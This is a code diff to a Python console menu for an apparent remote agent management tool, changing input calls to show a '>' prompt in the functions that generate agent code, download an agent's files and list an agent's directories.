@@ -27,7 +27,7 @@ def menu():
         i = i + 1
 
     console.print(table)
-    value = input()
+    value = input('>')
     if value == '1':
         generate_code_for_agent()
     if value == '2':
@@ -42,7 +42,7 @@ def menu():
 
 def generate_code_for_agent():
     console.print("Insert agent's ip address", style="info")
-    ip_address = input()
+    ip_address = input('>')
     code = cybServerGateway.generate_first_code_for_agent(cybServerGateway.GenerateFirstCodeForAgentInputType(
         ip_address=ip_address))
     menu()
@@ -50,9 +50,9 @@ def generate_code_for_agent():
 
 def download_file_from_agent():
     console.print("Insert agent's ip address", style="info")
-    ip_address = input()
+    ip_address = input('>')
     console.print("Insert agent's file path", style="info")
-    file_path = input()
+    file_path = input('>')
     cybServerGateway.download_file_from_agent(cybServerGateway.DownloadFileFromAgentInputType(
         ip_address=ip_address, file_path=file_path))
     menu()
@@ -60,9 +60,9 @@ def download_file_from_agent():
 
 def list_agent_files():
     console.print("Insert agent's ip address", style="info")
-    ip_address = input()
+    ip_address = input('>')
     console.print("Insert agent's directory path", style="info")
-    dir_path = input()
+    dir_path = input('>')
     cybServerGateway.list_files_from_agent(cybServerGateway.ListFilesFromAgentInputType(
         ip_address=ip_address, dir_path=dir_path))
     menu()
